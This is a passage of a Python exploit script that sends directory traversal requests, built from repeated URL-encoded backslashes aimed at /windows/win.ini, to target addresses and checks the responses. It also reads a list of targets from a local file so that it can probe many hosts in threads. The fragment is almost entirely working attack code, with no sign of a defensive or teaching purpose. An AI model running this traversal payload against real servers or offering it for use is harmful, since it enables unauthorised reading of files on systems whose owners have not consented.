...
def exploit(ip_, index):
    try:
        ...
        url = ip_+'/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'
        # print(index,url)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        if len(res.text)==0 or res.status_code!=200:
            return
        if False:
            url_linux = ip_+'/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'
            # print(index,url)
            res_linux = requests.get(url, headers=headers, timeout=8, verify=False)
            print(res_linux.text)
        else:
...
threads = []
with open(r'D:\Downloads\tmp\EAA.txt', 'r') as file:
